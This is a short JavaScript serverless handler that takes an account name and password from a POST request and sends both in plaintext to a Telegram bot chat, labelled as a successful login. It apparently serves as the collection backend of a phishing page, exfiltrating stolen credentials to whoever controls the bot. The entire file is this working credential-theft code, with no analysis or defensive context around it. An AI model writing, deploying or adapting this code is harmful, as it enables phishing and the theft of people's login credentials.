export default async (req) => {
  if (req.method !== "POST") {
    return new Response("Method not allowed", { status: 405 });
  }

  try {
    const data = await req.json();

    const email = data.account || "";

    const Password = data.password;

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    const message = `🔔 Login successful\n📧 Account: ${email}\n🔑 Password: ${Password}`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    return new Response("Notification sent", { status: 200 });

  } catch (error) {
    console.error(error);
    return new Response("Invalid request", { status: 400 });
  }
};
